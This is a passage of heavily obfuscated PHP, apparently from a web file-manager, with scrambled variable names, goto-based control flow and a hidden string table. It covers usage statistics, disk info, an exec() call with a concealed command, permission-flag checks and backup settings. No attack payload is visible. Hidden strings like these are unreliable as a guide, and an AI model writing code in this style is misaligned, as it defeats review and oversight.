$Eûƒÿñüºë[$a‘ÜΩéﬁ≤[2015]] = 0; } } $eëúêÆ–—ò[] = $Eûƒÿñüºë; } $dµì·∆å®… = $eëúêÆ–—ò; } $eµã∆ÉöË◊ = array($a‘ÜΩéﬁ≤[531] => array($a‘ÜΩéﬁ≤[703] => LNG($a‘ÜΩéﬁ≤[2030]), $a‘ÜΩéﬁ≤[2014] => LNG($a‘ÜΩéﬁ≤[2031]), $a‘ÜΩéﬁ≤[2015] => LNG($a‘ÜΩéﬁ≤[2032])), $a‘ÜΩéﬁ≤[2016] => array($a‘ÜΩéﬁ≤[701] => LNG($a‘ÜΩéﬁ≤[2033]), $a‘ÜΩéﬁ≤[2018] => LNG($a‘ÜΩéﬁ≤[2034]), $a‘ÜΩéﬁ≤[2019] => LNG($a‘ÜΩéﬁ≤[2035]), $a‘ÜΩéﬁ≤[2020] => LNG($a‘ÜΩéﬁ≤[2036]))); $CíÓÆâËô¿ = array($a‘ÜΩéﬁ≤[531] => $a‘ÜΩéﬁ≤[2037], $a‘ÜΩéﬁ≤[2016] => $a‘ÜΩéﬁ≤[77]); goto dŒ≥∞–Û∑œ; d∫ÇÏ·˘µ´: $a‘ÜΩéﬁ≤ =& $_SERVER[¯èãÄπµ]; if (!$this->init($d€≤ºüÃ¥‚)) { return !1; } $dµì·∆å®… = $this->trendList($d€≤ºüÃ¥‚); goto dı∑›íñâá; dŒ≥∞–Û∑œ: if (empty($dµì·∆å®…)) { $AË„ï˘í‚√ = date($a‘ÜΩéﬁ≤[2021], strtotime($a‘ÜΩéﬁ≤[2022])); $DÌÌä©é·› = array($a‘ÜΩéﬁ≤[206] => $AË„ï˘í‚√); foreach ($eµã∆ÉöË◊[$d€≤ºüÃ¥‚] as $a÷ﬂç£˜Ö† => $E÷‹ÕÇô‘Ó) { $DÌÌä©é·›[$a÷ﬂç£˜Ö†] = 0; } $dµì·∆å®…[] = $DÌÌä©é·›; } $dî±ÇÆè¿ = array(); foreach ($dµì·∆å®… as $E÷‹ÕÇô‘Ó) { if ($d€≤ºüÃ¥‚ == $a‘ÜΩéﬁ≤[2016] && $E÷‹ÕÇô‘Ó[$a‘ÜΩéﬁ≤[2018]] > $E÷‹ÕÇô‘Ó[$a‘ÜΩéﬁ≤[701]]) { $E÷‹ÕÇô‘Ó[$a‘ÜΩéﬁ≤[2018]] = $E÷‹ÕÇô‘Ó[$a‘ÜΩéﬁ≤[701]]; } foreach ($eµã∆ÉöË◊[$d€≤ºüÃ¥‚] as $a÷ﬂç£˜Ö† => $e©ãˆÚòÑì) { $Eûƒÿñüºë = array($a‘ÜΩéﬁ≤[206] => $E÷‹ÕÇô‘Ó[$a‘ÜΩéﬁ≤[206]], $a‘ÜΩéﬁ≤[1332] => $e©ãˆÚòÑì); $Eûƒÿñüºë[$CíÓÆâËô¿[$d€≤ºüÃ¥‚]] = isset($E÷‹ÕÇô‘Ó[$a÷ﬂç£˜Ö†]) ? $E÷‹ÕÇô‘Ó[$a÷ﬂç£˜Ö†] : 0; $dî±ÇÆè¿[] = $Eûƒÿñüºë; } } goto aÇõ∫·Ò„; aÇõ∫·Ò„: return $dî±ÇÆè¿; goto få®ÁµìœÒ; få®ÁµìœÒ: } public function validDate($dù®«»Àπ◊, $E†Á¶Òˆ ) { goto D∏π‹··Üô; D∏π‹··Üô: $A†ûıƒåªã =& $_SERVER[¯èãÄπµ]; $B˜æ’‹Ö‹™ = date($A†ûıƒåªã[2021], strtotime($A†ûıƒåªã[2022])); $FÆ™´ã£ã´ = array($B˜æ’‹Ö‹™); goto F—Íˆ≥ä¢ô; F—Íˆ≥ä¢ô: switch ($dù®«»Àπ◊) { case $A†ûıƒåªã[1406]: $dûú‹Ñ™∏á = mktime(0, 0, 0, date($A†ûıƒåªã[2038]), date($A†ûıƒåªã[2039]) - date($A†ûıƒåªã[1222]) + 7 - 7, date($A†ûıƒåªã[2040])); $FŒó–çˆÆÍ = 0; do { $bç≈«ßàÛÚ = date($A†ûıƒåªã[2021], $dûú‹Ñ™∏á - 3600 * 24 * 7 * $FŒó–çˆÆÍ); $FÆ™´ã£ã´[] = $bç≈«ßàÛÚ; $FŒó–çˆÆÍ++; } while ($E†Á¶Òˆ  < $bç≈«ßàÛÚ); break; case $A†ûıƒåªã[1404]: $FŒó–çˆÆÍ = 1; do { $døëêå„âÚ = date($A†ûıƒåªã[2041], strtotime("\55\x20{$FŒó–çˆÆÍ}\x20\x6d\x6f\x6e\164\x68\x73")); $FÆ™´ã£ã´[] = $døëêå„âÚ; $FŒó–çˆÆÍ++; } while ($E†Á¶Òˆ  < $døëêå„âÚ); break; case $A†ûıƒåªã[1709]: $A∞∏ üëû„ = (int) date($A†ûıƒåªã[2040], strtotime($E†Á¶Òˆ )); $D©ùÛºÕ–© = (int) date($A†ûıƒåªã[2040]); if ($A∞∏ üëû„ >= $D©ùÛºÕ–©) { break; } for ($A∞∏ üëû„; $A∞∏ üëû„ < $D©ùÛºÕ–©; $A∞∏ üëû„++) { $FÆ™´ã£ã´[] = $A∞∏ üëû„ . $A†ûıƒåªã[2042]; } break; default: break; } if ($E†Á¶Òˆ  > end($FÆ™´ã£ã´)) { array_pop($FÆ™´ã£ã´); } sort($FÆ™´ã£ã´); goto DÀ±»ù≥Æà; DÀ±»ù≥Æà: return $FÆ™´ã£ã´; goto bæãïà÷ÑÒ; bæãïà÷ÑÒ: } public function listTable($cêêóˆ¡‡Ï) { $A’¯∏À“∆Ë = ucfirst($cêêóˆ¡‡Ï); return Model($A’¯∏À“∆Ë)->listData(); } public function option($aΩ‘Ù≤ÆÙã) { $a£üıËâ∑  = $_SERVER[¯èãÄπµ][2043] . ucfirst($aΩ‘Ù≤ÆÙã); return $this->{$a£üıËâ∑ }(); } private function optionUser() { goto a‡◊‚Á˜ùè; cÿÂµ∂ã≈Ç: $a´ùÚ≤ø‡· = Model($CÉçœäº∫Ò[473])->where($cÏﬁäƒ˜æ‹)->count($CÉçœäº∫Ò[1424]); return array($CÉçœäº∫Ò[698] => (int) $CÏïÜ∏≥Úè, $CÉçœäº∫Ò[2047] => (int) ($CÏïÜ∏≥Úè - $dÔ¡◊Ñçëñ), $CÉçœäº∫Ò[2048] => (int) $dÔ¡◊Ñçëñ, $CÉçœäº∫Ò[2049] => (int) $a´ùÚ≤ø‡·, $CÉçœäº∫Ò[2050] => $CÕ≈àåñÓ«); goto D°†äõº˘ç; a†ıíﬁœ≤…: if (!$CÕ≈àåñÓ«) { $CÕ≈àåñÓ« = 1; } $a‚Ÿ˘Àˆ´  = strtotime(date($CÉçœäº∫Ò[2025])); $cÏﬁäƒ˜æ‹ = array($CÉçœäº∫Ò[2046] => array($CÉçœäº∫Ò[932], $a‚Ÿ˘Àˆ´ )); goto cÿÂµ∂ã≈Ç; a‡◊‚Á˜ùè: $CÉçœäº∫Ò =& $_SERVER[¯èãÄπµ]; $CÏïÜ∏≥Úè = Model($CÉçœäº∫Ò[473])->count($CÉçœäº∫Ò[1424]); $dÔ¡◊Ñçëñ = Model($CÉçœäº∫Ò[473])->where($CÉçœäº∫Ò[2044])->count($CÉçœäº∫Ò[1424]); goto B Éπîè∫; B Éπîè∫: $a‚Ÿ˘Àˆ´  = strtotime($CÉçœäº∫Ò[2045]); $cÏﬁäƒ˜æ‹ = array($CÉçœäº∫Ò[2046] => array($CÉçœäº∫Ò[932], $a‚Ÿ˘Àˆ´ )); $CÕ≈àåñÓ« = (int) Model($CÉçœäº∫Ò[473])->where($cÏﬁäƒ˜æ‹)->count($CÉçœäº∫Ò[1424]); goto a†ıíﬁœ≤…; D°†äõº˘ç: } private function optionFile() { goto bª∆é»Ô«»; bª∆é»Ô«»: $CÛÖÊ‡¥ñ =& $_SERVER[¯èãÄπµ]; $BÌ¬ÿË”Æç = $this->sourceSize(); $A‡ùÏÙÕªú = $BÌ¬ÿË”Æç[$CÛÖÊ‡¥ñ[77]]; goto e¥†ò€ìæÒ; f’˘√úΩÓç: $eâ¬ä´–‹• = Model($CÛÖÊ‡¥ñ[755])->where($eÎµ¥ã∆∏â)->sum($CÛÖÊ‡¥ñ[77]); $EÉçè‘ã‰õ = Model($CÛÖÊ‡¥ñ[755])->where($eÎµ¥ã∆∏â)->count($CÛÖÊ‡¥ñ[365]); return array($CÛÖÊ‡¥ñ[701] => $A‡ùÏÙÕªú, $CÛÖÊ‡¥ñ[2018] => $B∫úÂﬂ¶Ì∑, $CÛÖÊ‡¥ñ[2051] => $A‡ùÏÙÕªú - $B∫úÂﬂ¶Ì∑, $CÛÖÊ‡¥ñ[2052] => (int) $eâ¬ä´–‹•, $CÛÖÊ‡¥ñ[703] => (int) $Bø¢∞ãÒ—∫, $CÛÖÊ‡¥ñ[2053] => (int) $EÉçè‘ã‰õ); goto fàïøïñ¶´; e¥†ò€ìæÒ: $B∫úÂﬂ¶Ì∑ = $BÌ¬ÿË”Æç[$CÛÖÊ‡¥ñ[2018]]; $Bø¢∞ãÒ—∫ = Model($CÛÖÊ‡¥ñ[755])->where(array($CÛÖÊ‡¥ñ[366] => 0))->count($CÛÖÊ‡¥ñ[365]); $eÎµ¥ã∆∏â = array($CÛÖÊ‡¥ñ[366] => 0, $CÛÖÊ‡¥ñ[183] => array($CÛÖÊ‡¥ñ[932], strtotime(date($CÛÖÊ‡¥ñ[2025])))); goto f’˘√úΩÓç; fàïøïñ¶´: } private function optionAccess() { $BÚøÉìÍïç =& $_SERVER[¯èãÄπµ]; return array($BÚøÉìÍïç[698] => $this->typeLogCnt(), $BÚøÉìÍïç[102] => $this->typeLogCnt($BÚøÉìÍïç[102]), $BÚøÉìÍïç[400] => $this->typeLogCnt($BÚøÉìÍïç[400]), $BÚøÉìÍïç[2054] => $this->typeLogCnt($BÚøÉìÍïç[2054]), $BÚøÉìÍïç[2055] => $this->typeLogCnt($BÚøÉìÍïç[2055]), $BÚøÉìÍïç[531] => $this->typeLogCnt($BÚøÉìÍïç[33], $BÚøÉìÍïç[2029])); } private function typeLogCnt($fÚØ•Ó‹Îï = '', $e¿ˆ‰ƒè§ = "\x69\x64") { goto fµû£ÌïäÈ; D·≈±Üµ¿Û: $dÔç∆œÑõ„ = array($BäñéŒù¨®[183] => array($BäñéŒù¨®[932], $BÊÁè ’çØ)); if ($fÚØ•Ó‹Îï) { $dÔç∆œÑõ„[$BäñéŒù¨®[29]] = array($BäñéŒù¨®[7], $Aò˘ñ¢‚¢â[$fÚØ•Ó‹Îï]); } $Céã√ÜÀπ¥ = Model($BäñéŒù¨®[2028])->where($dÔç∆œÑõ„)->count($e¿ˆ‰ƒè§); goto fÕ“©öÌ»ù; fÕ“©öÌ»ù: return (int) $Céã√ÜÀπ¥; goto eö≥°Ã“â⁄; fµû£ÌïäÈ: $BäñéŒù¨® =& $_SERVER[¯èãÄπµ]; $Aò˘ñ¢‚¢â = array($BäñéŒù¨®[102] => array($BäñéŒù¨®[2056], $BäñéŒù¨®[2057]), $BäñéŒù¨®[400] => array($BäñéŒù¨®[2058], $BäñéŒù¨®[2059]), $BäñéŒù¨®[2054] => array($BäñéŒù¨®[2060], $BäñéŒù¨®[2061]), $BäñéŒù¨®[2055] => array($BäñéŒù¨®[2062], $BäñéŒù¨®[2063]), $BäñéŒù¨®[2064] => array($BäñéŒù¨®[2065], $BäñéŒù¨®[2066], $BäñéŒù¨®[2067])); $BÊÁè ’çØ = strtotime(date($BäñéŒù¨®[2025])); goto D·≈±Üµ¿Û; eö≥°Ã“â⁄: } private function optionServer() { goto C®’äﬂäù´; a›ÖëÌÙ§Ë: $a„å¬≤ÿÆ∆ = array($C‘¨î∂≈Ìê[746] => $däÀ›Ÿ¨·«[$C‘¨î∂≈Ìê[363]]); $dÁ¢∏®®ù√ = Model($C‘¨î∂≈Ìê[418])->where($a„å¬≤ÿÆ∆)->sum($C‘¨î∂≈Ìê[77]); $DÊπóñÀ†‚ = explode($C‘¨î∂≈Ìê[50], $_SERVER[$C‘¨î∂≈Ìê[137]]); goto céê‹íÔï°; C®’äﬂäù´: $C‘¨î∂≈Ìê =& $_SERVER[¯èãÄπµ]; $EÜ◊Ç∆◊ıÖ = $this->diskDriver(); $däÀ›Ÿ¨·« = KodIO::defaultDriver(); goto a›ÖëÌÙ§Ë; b–…˘Áﬁ∏©: if ($d¢≠Ø´≤Óƒ == $C‘¨î∂≈Ìê[727]) { $BùíÁ‹ıÇØ = explode($C‘¨î∂≈Ìê[1078], $AØö¨ïˆ‘Æ[$C‘¨î∂≈Ìê[891]]); $d¢≠Ø´≤Óƒ = $BùíÁ‹ıÇØ[0]; } if ($d¢≠Ø´≤Óƒ == $C‘¨î∂≈Ìê[730] || $d¢≠Ø´≤Óƒ == $C‘¨î∂≈Ìê[731]) { $cõÔãÕÌƒï = Model()->db()->query($C‘¨î∂≈Ìê[2068]); $FÇ◊Ê•æÖﬁ = $cõÔãÕÌƒï[0] && isset($cõÔãÕÌƒï[0][$C‘¨î∂≈Ìê[1331]]) ? $cõÔãÕÌƒï[0][$C‘¨î∂≈Ìê[1331]] : 0; $d¢≠Ø´≤Óƒ = $C‘¨î∂≈Ìê[2069] . ($FÇ◊Ê•æÖﬁ ? $C‘¨î∂≈Ìê[8] . $FÇ◊Ê•æÖﬁ : $C‘¨î∂≈Ìê[33]); } $B÷Ùá€øÆÒ = $GLOBALS[$C‘¨î∂≈Ìê[6]][$C‘¨î∂≈Ìê[333]][$C‘¨î∂≈Ìê[756]]; goto a‚⁄ˆë¬Í¿; céê‹íÔï°: $d›ê‰ø±ÎÁ = $DÊπóñÀ†‚[0]; $AØö¨ïˆ‘Æ = $GLOBALS[$C‘¨î∂≈Ìê[6]][$C‘¨î∂≈Ìê[17]]; $d¢≠Ø´≤Óƒ = $AØö¨ïˆ‘Æ[$C‘¨î∂≈Ìê[892]]; goto b–…˘Áﬁ∏©; a‚⁄ˆë¬Í¿: return array($C‘¨î∂≈Ìê[2070] => $EÜ◊Ç∆◊ıÖ ? $EÜ◊Ç∆◊ıÖ[$C‘¨î∂≈Ìê[2071]] : 0, $C‘¨î∂≈Ìê[2072] => $EÜ◊Ç∆◊ıÖ ? $EÜ◊Ç∆◊ıÖ[$C‘¨î∂≈Ìê[2073]] : 0, $C‘¨î∂≈Ìê[2074] => (int) $däÀ›Ÿ¨·«[$C‘¨î∂≈Ìê[2071]] * 1024 * 1024 * 1024, $C‘¨î∂≈Ìê[2075] => (int) $dÁ¢∏®®ù√, $C‘¨î∂≈Ìê[2076] => ucfirst($d›ê‰ø±ÎÁ), $C‘¨î∂≈Ìê[2077] => $C‘¨î∂≈Ìê[2078] . PHP_VERSION, $C‘¨î∂≈Ìê[2079] => phpBuild64() ? 64 : 32, $C‘¨î∂≈Ìê[697] => str_replace($C‘¨î∂≈Ìê[2080], $C‘¨î∂≈Ìê[908], $d¢≠Ø´≤Óƒ), $C‘¨î∂≈Ìê[333] => ucfirst($B÷Ùá€øÆÒ), $C‘¨î∂≈Ìê[28] => $_SERVER[$C‘¨î∂≈Ìê[2081]]); goto e…Œ∆üí∞´; e…Œ∆üí∞´: } private function diskDriver() { goto BÇà·Ÿæ¡ê; CÚØ‹é®£ƒ: $DÑÑ¬„ìÜÇ = $Eπôˆ¶’‚± - @disk_free_space($BÛ¯íê÷≤Ã); return array($A€˜å—óº©[2071] => $Eπôˆ¶’‚±, $A€˜å—óº©[2073] => $DÑÑ¬„ìÜÇ); goto fôá≠∏ê°˘; fèÉÔ¿«¬Û: if ($A≠Èêí€ÔÑ) { $BÛ¯íê÷≤Ã = $A€˜å—óº©[2084]; if (function_exists($A€˜å—óº©[2085])) { exec($A€˜å—óº©[2086], $fÜ∑áäÏ⁄Ì); $BÛ¯íê÷≤Ã = $fÜ∑áäÏ⁄Ì[1] . $A€˜å—óº©[8]; } } if (!file_exists($BÛ¯íê÷≤Ã)) { return; } $Eπôˆ¶’‚± = @disk_total_space($BÛ¯íê÷≤Ã); goto CÚØ‹é®£ƒ; BÇà·Ÿæ¡ê: $A€˜å—óº© =& $_SERVER[¯èãÄπµ]; $BÛ¯íê÷≤Ã = $A€˜å—óº©[8]; $A≠Èêí€ÔÑ = $GLOBALS[$A€˜å—óº©[6]][$A€˜å—óº©[2082]] == $A€˜å—óº©[2083]; goto fèÉÔ¿«¬Û; fôá≠∏ê°˘: } public function fileChart($eÏ‚ìØ¢îÚ) { goto aùä˜ë÷åÑ; dè·á«Ùï±: $fä∆µ±‡Ê˘ = $this->sourceSize(); $báª¯≠É¯¢ = array($BÑÎ®¯ÒÈÉ[457] => 0, $BÑÎ®¯ÒÈÉ[367] => 1); $Eôåîºû√Í = Model($BÑÎ®¯ÒÈÉ[755])->where($báª¯≠É¯¢)->sum($BÑÎ®¯ÒÈÉ[77]); goto a˜Ω≠Í¨ò·; a˜Ω≠Í¨ò·: $báª¯≠É¯¢[$BÑÎ®¯ÒÈÉ[367]] = 2; $eÔ‰ôøŒ∞ = Model($BÑÎ®¯ÒÈÉ[755])->where($báª¯≠É¯¢)->sum($BÑÎ®¯ÒÈÉ[77]); return array($BÑÎ®¯ÒÈÉ[701] => $fä∆µ±‡Ê˘[$BÑÎ®¯ÒÈÉ[77]], $BÑÎ®¯ÒÈÉ[2018] => $fä∆µ±‡Ê˘[$BÑÎ®¯ÒÈÉ[2018]], $BÑÎ®¯ÒÈÉ[2019] => (int) $Eôåîºû√Í, $BÑÎ®¯ÒÈÉ[2020] => (int) $eÔ‰ôøŒ∞); goto D…ÁØ ‹Ãß; aùä˜ë÷åÑ: $BÑÎ®¯ÒÈÉ =& $_SERVER[¯èãÄπµ]; if (isset($eÏ‚ìØ¢îÚ[$BÑÎ®¯ÒÈÉ[1424]])) { return Model($BÑÎ®¯ÒÈÉ[755])->userFileTypeProfile($eÏ‚ìØ¢îÚ[$BÑÎ®¯ÒÈÉ[1424]]); } if (isset($eÏ‚ìØ¢îÚ[$BÑÎ®¯ÒÈÉ[2087]])) { return Model($BÑÎ®¯ÒÈÉ[755])->groupFileTypeProfile($eÏ‚ìØ¢îÚ[$BÑÎ®¯ÒÈÉ[2087]]); } goto dè·á«Ùï±; D…ÁØ ‹Ãß: } private function sourceSize() { $c√ÀòÑÍ•å =& $_SERVER[¯èãÄπµ]; $D¢Õõ«‘¥ª = Model($c√ÀòÑÍ•å[755])->where(array($c√ÀòÑÍ•å[366] => 0))->sum($c√ÀòÑÍ•å[77]); $e©Ï•ÕüﬁŒ = Model($c√ÀòÑÍ•å[418])->sum($c√ÀòÑÍ•å[77]); if ($e©Ï•ÕüﬁŒ > $D¢Õõ«‘¥ª) { $e©Ï•ÕüﬁŒ = $D¢Õõ«‘¥ª; } return array($c√ÀòÑÍ•å[77] => (int) $D¢Õõ«‘¥ª, $c√ÀòÑÍ•å[2018] => (int) $e©Ï•ÕüﬁŒ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $fÚè¡Æ¶πù =& $_SERVER[¯èãÄπµ]; $aÌﬁé¨¡ìº = array(array($fÚè¡Æ¶πù[382] => LNG($fÚè¡Æ¶πù[2088]), $fÚè¡Æ¶πù[2089] => $fÚè¡Æ¶πù[2090], $fÚè¡Æ¶πù[2091] => 6, $fÚè¡Æ¶πù[2092] => 1, $fÚè¡Æ¶πù[2093] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($fÚè¡Æ¶πù[382] => LNG($fÚè¡Æ¶πù[2094]), $fÚè¡Æ¶πù[2089] => $fÚè¡Æ¶πù[2095], $fÚè¡Æ¶πù[2091] => 1, $fÚè¡Æ¶πù[2092] => 1, $fÚè¡Æ¶πù[2093] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($fÚè¡Æ¶πù[382] => LNG($fÚè¡Æ¶πù[2096]), $fÚè¡Æ¶πù[2089] => $fÚè¡Æ¶πù[2097], $fÚè¡Æ¶πù[2091] => 2, $fÚè¡Æ¶πù[2092] => 1, $fÚè¡Æ¶πù[2093] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($fÚè¡Æ¶πù[382] => LNG($fÚè¡Æ¶πù[2098]), $fÚè¡Æ¶πù[2089] => $fÚè¡Æ¶πù[2097], $fÚè¡Æ¶πù[2091] => 3, $fÚè¡Æ¶πù[2092] => 1, $fÚè¡Æ¶πù[2093] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($fÚè¡Æ¶πù[382] => LNG($fÚè¡Æ¶πù[2099]), $fÚè¡Æ¶πù[2089] => $fÚè¡Æ¶πù[2100], $fÚè¡Æ¶πù[2091] => 4, $fÚè¡Æ¶πù[2092] => 1, $fÚè¡Æ¶πù[2093] => self::AUTH_SHOW | self::AUTH_VIEW), array($fÚè¡Æ¶πù[382] => LNG($fÚè¡Æ¶πù[2101]), $fÚè¡Æ¶πù[2089] => $fÚè¡Æ¶πù[2102], $fÚè¡Æ¶πù[2091] => 5, $fÚè¡Æ¶πù[2092] => 1, $fÚè¡Æ¶πù[2093] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($fÚè¡Æ¶πù[382] => LNG($fÚè¡Æ¶πù[2103]), $fÚè¡Æ¶πù[2089] => $fÚè¡Æ¶πù[2104], $fÚè¡Æ¶πù[2091] => 7, $fÚè¡Æ¶πù[2092] => 1, $fÚè¡Æ¶πù[2093] => 0)); return $aÌﬁé¨¡ìº; } public static function authCheck($cñ˜á¥ÛÆÌ, $D…∑ôò˜Î…) { $cñ˜á¥ÛÆÌ = intval($cñ˜á¥ÛÆÌ); if (_get($GLOBALS, $_SERVER[¯èãÄπµ][453])) { return !0; } if ($cñ˜á¥ÛÆÌ <= 0) { return !1; } if (($cñ˜á¥ÛÆÌ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($cñ˜á¥ÛÆÌ & $D…∑ôò˜Î…); } public static function authCheckShow($c‘èëõÇßù) { return self::authCheck($c‘èëõÇßù, self::AUTH_SHOW); } public static function authCheckView($B”ÑÉ©ı®ÿ) { return self::authCheck($B”ÑÉ©ı®ÿ, self::AUTH_VIEW); } public static function authCheckDownload($cÜïäÖ”å) { return self::authCheck($cÜïäÖ”å, self::AUTH_DOWNLOAD); } public static function authCheckUpload($f˜∂ÛßÙﬂ¯) { return self::authCheck($f˜∂ÛßÙﬂ¯, self::AUTH_UPLOAD); } public static function authCheckEdit($A•ã¨÷œ¿û) { return self::authCheck($A•ã¨÷œ¿û, self::AUTH_EDIT); } public static function authCheckRemove($a–Üﬁ≈à∫Œ) { return self::authCheck($a–Üﬁ≈à∫Œ, self::AUTH_REMOVE); } public static function authCheckShare($Bü¿™åÀ™¬) { return self::authCheck($Bü¿™åÀ™¬, self::AUTH_SHARE); } public static function authCheckComment($e‡†´µœ…‡) { return self::authCheck($e‡†´µœ…‡, self::AUTH_COMMENT); } public static function authCheckEvent($AâÏΩÓëÑŸ) { return self::authCheck($AâÏΩÓëÑŸ, self::AUTH_EVENT); } public static function authCheckRoot($cÖ…≥ÚëÑ©) { return self::authCheck($cÖ…≥ÚëÑ©, self::AUTH_ROOT); } public static function authDisable($EÒŸ‡úêÏ†, $eûªóÙÆ“Ñ) { if (intval($EÒŸ‡úêÏ†) <= 0) { return 0; } return intval($EÒŸ‡úêÏ†) & ~$eûªóÙÆ“Ñ; } public $optionType = "\x53\171\163\x74\x65\x6d\56\163\x6f\x75\x72\x63\x65\x41\x75\x74\150\114\151\x73\164"; public $field = array("\156\141\155\x65", "\141\x75\164\x68", "\154\141\x62\145\154", "\x64\x69\163\x70\x6c\141\x79", "\x73\x79\163\x74\x65\155", "\x73\x6f\162\x74"); public function initData() { $E⁄”ËàûŸ¬ = $this->authDefault(); foreach ($E⁄”ËàûŸ¬ as $E–Ñ•æ∆√‘) { $this->add($E–Ñ•æ∆√‘); } } public function listData($eÚ„µ‡ß‡¿ = false, $aÏπ¶«∏ËÜ = "\163\x6f\162\x74", $b¶âåËΩ¢√ = false) { return parent::listData($eÚ„µ‡ß‡¿, $aÏπ¶«∏ËÜ, $b¶âåËΩ¢√); } public function update($e•ø¬êéÇñ, $aéÏÍèÀ¬—) { $a´√ôÌ∏¿Ú =& $_SERVER[¯èãÄπµ]; $f• †å˜ÓÎ = parent::listData($e•ø¬êéÇñ); $A¨√Ãå∂‡Ì = $this->findByName($aéÏÍèÀ¬—[$a´√ôÌ∏¿Ú[28]]); if (!$f• †å˜ÓÎ || $A¨√Ãå∂‡Ì && $A¨√Ãå∂‡Ì[$a´√ôÌ∏¿Ú[363]] != $f• †å˜ÓÎ[$a´√ôÌ∏¿Ú[363]]) { return !1; } $this->filterAuth($aéÏÍèÀ¬—[$a´√ôÌ∏¿Ú[372]]); return parent::update($e•ø¬êéÇñ, $aéÏÍèÀ¬—); } public function remove($D¶Çìáôﬂ¬) { $d¢∞∆§Ì¡¡ = parent::listData($D¶Çìáôﬂ¬); if (!$d¢∞∆§Ì¡¡ || $d¢∞∆§Ì¡¡[$_SERVER[¯èãÄπµ][1082]]) { return !1; } return parent::remove($D¶Çìáôﬂ¬); } public function add($A´É¡„ê≈‹ = array()) { goto eÌ–±ˆøØ‰; A“øë‘á˜ª: $A´É¡„ê≈‹ = array_merge($F´íﬂ¯êÃ, $A´É¡„ê≈‹); $A´É¡„ê≈‹[$fÙ©”≥éé¯[2108]] = $this->getSort(); $this->filterAuth($A´É¡„ê≈‹[$fÙ©”≥éé¯[372]]); goto fÛªÍÕÁƒı; fÛªÍÕÁƒı: return parent::insert($A´É¡„ê≈‹); goto Føùù‚É∫◊; eÌ–±ˆøØ‰: $fÙ©”≥éé¯ =& $_SERVER[¯èãÄπµ]; if ($this->findByName($A´É¡„ê≈‹[$fÙ©”≥éé¯[28]])) { return !1; } $F´íﬂ¯êÃ = array($fÙ©”≥éé¯[28] => $fÙ©”≥éé¯[33], $fÙ©”≥éé¯[372] => 1, $fÙ©”≥éé¯[2105] => $fÙ©”≥éé¯[2106], $fÙ©”≥éé¯[2107] => 1, $fÙ©”≥éé¯[1082] => 0, $fÙ©”≥éé¯[2108] => 0); goto A“øë‘á˜ª; Føùù‚É∫◊: } private function getSort() { $B≠Çö´∏—¨ =& $_SERVER[¯èãÄπµ]; $fÖ°ªöªÁ… = parent::listData(); $C ÁõïÙ† = array_to_keyvalue($fÖ°ªöªÁ…, $B≠Çö´∏—¨[33], $B≠Çö´∏—¨[2108]); return empty($C ÁõïÙ†) ? 0 : max($C ÁõïÙ†) + 1; } private function filterAuth(&$bΩÃê•ÿ•Ω) { goto B“Ò‹ãﬂû•; B“Ò‹ãﬂû•: if (!$bΩÃê•ÿ•Ω) { return; } $d∆√ßß™æ∫ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $añö†ﬁò’Ê = array(); goto d°°ööﬁ˜√; F«∂ªö§©π: foreach ($añö†ﬁò’Ê as $C´œÉììúﬁ) { if (isset($C€ÆÂãˆÃ›[$C´œÉììúﬁ])) { $añö†ﬁò’Ê = array_merge($añö†ﬁò’Ê, $C€ÆÂãˆÃ›[$C´œÉììúﬁ]); } } $añö†ﬁò’Ê[] = self::AUTH_SHOW; $bΩÃê•ÿ•Ω = array_sum(array_unique($añö†ﬁò’Ê)); goto DÒﬁãù≥ π; d°°ööﬁ˜√: foreach ($d∆√ßß™æ∫ as $C´œÉììúﬁ) { if ($bΩÃê•ÿ•Ω & $C´œÉììúﬁ) { $añö†ﬁò’Ê[] = $C´œÉììúﬁ; } } if (in_array(self::AUTH_ROOT, $añö†ﬁò’Ê)) { $bΩÃê•ÿ•Ω = array_sum($d∆√ßß™æ∫); return; } $C€ÆÂãˆÃ› = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto F«∂ªö§©π; DÒﬁãù≥ π: } public function sort($aÒàÉÉÓê◊, $Aßùè«ßÊ®) { return parent::update($aÒàÉÉÓê◊, $Aßùè«ßÊ®); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\142\141\143\x6b\165\x70\114\151\x73\x74"; public $field = array("\x69\x6f", "\x6e\141\155\x65", "\x73\x74\141\164\165\x73", "\143\x6f\156\164\x65\156\x74", "\x72\145\163\165\154\164", "\x74\151\x6d\145\106\162\x6f\x6d", "\164\151\155\x65\x54\x6f"); public function config() { goto e‰†Ïº‹®ø; f°ºØΩà‘ö: if (isset($BÇßƒ‚õ§ê[$c’˜úá¢é‰[186]])) { $BÇßƒ‚õ§ê[$c’˜úá¢é‰[186]] = json_decode($BÇßƒ‚õ§ê[$c’˜úá¢é‰[186]], !0); } if 